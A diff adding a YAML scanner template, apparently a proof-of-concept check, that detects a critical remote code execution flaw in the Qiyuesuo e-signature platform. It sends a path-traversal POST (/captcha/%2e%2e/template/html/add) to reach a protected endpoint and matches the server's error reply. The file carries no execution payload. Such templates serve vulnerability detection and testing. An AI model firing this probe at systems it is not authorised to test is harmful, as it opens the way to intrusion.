@@ -1,0 +1,26 @@
+id: poc-yaml-qiyuesuo-add-rce
+info:
+  name: 契约锁电子签章平台远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 契约锁
+requests:
+- method: POST
+  path: /captcha/%2e%2e/template/html/add
+  headers:
+    Content-Type: application/json
+  data: '{}
+
+    '
+  expression: status_code == 200 && contains(body, "\\u672A\\u586B\\u5199\\u53C2\\u6570\\uFF1Afile\"")
+- method: POST
+  path: /captcha/%2e%2e11/template/html/add
+  headers:
+    Content-Type: application/json
+  data: '{}
+
+    '
+  expression: status_code != 200 && !contains(body, "\\u672A\\u586B\\u5199\\u53C2\\u6570\\uFF1A\"")
+variables: {}
+transport: http
